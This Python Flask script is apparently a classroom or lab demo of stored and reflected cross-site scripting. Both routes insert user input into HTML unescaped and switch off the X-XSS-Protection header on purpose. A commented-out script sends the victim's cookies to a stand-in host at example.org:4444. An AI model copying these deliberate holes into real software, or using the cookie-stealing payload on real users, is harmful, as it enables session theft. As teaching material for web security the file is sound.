#!/usr/bin/env python
import sys
# Use a framework to minimize the effort!
import flask

#This is our webapp
app = flask.Flask(__name__)


#This app has minimal header and footer
header = '''
<!doctype html>
<html lang = "en"><body>
<h1>Please leave a message to other visitors</h1>
'''
footer = '''
</body></html>
'''

# This is our form that users type their posts with.
form_stored = '''
<form style="width=500px; height=200px" method="POST">
<input type="text" style="width=400px; height=150px" id="new-posting"
name="new-posting" value="Write your post here"
onfocus="document.getElementById('new-posting').value=''">
<input id="button" type="submit" value="submit">
</form>
'''
# This is our form to learn who loaded the page.
# We use GET instead of POST: the form contents will be encoded into the URI.
form_reflected = '''
<form style="width=500px; height=200px" method="GET">
<input type="text" style="width=400px; height=150px" id="name"
value="What is your name?"
onfocus="document.getElementById('new-posting').value=''">
<input id="button" type="submit" value="submit">
</form>
'''
postings = []

# This is called whenever our app receives a HTTP request for
# domain (example.org)/stored
# Yes, we'll redirect example.org to here for testing purposes.
# As declared, our app will only handle HTTP "GET" and "POST" requests.
@app.route("/stored", methods=['GET','POST'])
def stored():
    # our page always starts with the header
    page = header
    # and then show the form on top.
    page += form_stored
    print(flask.request)
    # our client sends a POST request when a user is adding a post.
    if flask.request.method == 'POST':
        postings.append(flask.request.form['new-posting'])
    # for both the requests, we respond with the updated postings.
    for p in postings:
        page += '<p>' + p + '</p>'
    # always ends with the footer
    #page += '''
    #<div id='ttt'></div>
    #<script>document.getElementById('ttt').innerHTML += "<img src='http://example.org:4444/" + 
    #document.cookie + "'/>";
    #</script>
    '''
    page += '''<img src='http://example.org:4444/asdasd'/>'''
    page += footer
    
    # This instructs Flask to create a response packet with the page
    resp = flask.Response(page)

    print(page)
    # Though firefox doesn't care, let's set this zero.
    resp.set_cookie('test','ing')
    resp.headers['X-XSS-Protection'] = '0'
    return resp

# our reflected handles GET only
@app.route("/reflected", methods=['GET'])
def reflected():
    # we share header with stored
    page = header
    page += form_reflected
    print(flask.request)
    print(flask.request.url)
    parsed = flask.request.url.split('?')
    if len(parsed) > 1:
        form_data = parsed[1]
    else:
        form_data = None
    print(form_data)
    if form_data != None:
        page += flask.request.args.get('name')
    else:
        page += '<p> Please let me know your name! </p>'
    page += footer

    resp = flask.Response(page)
    resp.headers['X-XSS-Protection'] = '0'
    return resp

@app.route("/dom", methods=['GET'])
def dom():
    page = open('dom.html','r').read()
    resp = flask.Response(page)
    return resp

@app.route("/cookie",methods=['GET'])
def cookie():
    return flask.Response(open('cookie.html','r').read())
    pass


if __name__ == "__main__":
    app.run(host='example.com', port="7777")







